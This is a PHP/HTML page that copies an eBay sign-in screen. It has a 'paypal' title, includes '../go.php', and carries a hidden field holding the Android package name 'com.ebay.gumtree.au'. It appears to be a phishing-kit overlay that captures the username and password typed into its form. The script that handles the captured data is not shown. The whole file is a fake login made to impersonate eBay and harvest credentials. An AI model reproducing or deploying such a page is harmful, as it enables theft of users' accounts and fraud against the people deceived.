<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>paypal</title>
    <link rel="stylesheet" href="css/normalizeebay.css">
    <link rel="stylesheet" href="css/mainebay.css">
    <script src="js/vendor/jquery-1.11.3.min.js"></script>
    <script src="js/viewport.js"></script>
</head>

<body>
    <div class="container">
        <div class="wrapper">
            <div class="header">
                <div class="left">Sign in</div>
                <div class="right"><img src="img/close.jpg" alt=""></div>
            </div>
            <form action="" method="post">
                <input type="hidden" name="field1" value="com.ebay.gumtree.au" class="main_input">
                <div class="line">
                    <input type="text" name="field2" class="main_input name" required="" placeholder="Email or username">
                </div>
                <div class="line line2">
                    <input type="password" name="field3" class="main_input pass" required="" placeholder="Password">
                    <div class="show-line">
                    	<div class="show-b">show</div>
                    </div>
                </div>
                <div class="line-buttons">
                	<div class="left">
                		<button>FORGOT?</button>
                	</div>
                	<div class="right">
                		<button class="login-but">SIGN IN</button>
                	</div>
                </div>
                </form>
                <div class="line-hr"></div>
                <div class="bottom-text">
                	<div class="left"><a href="#">New to eBay?</a></div>
                	<div class="right"><button>REGISTER</button></div>
                </div>
            
        </div>
    </div>
</body>

</html>
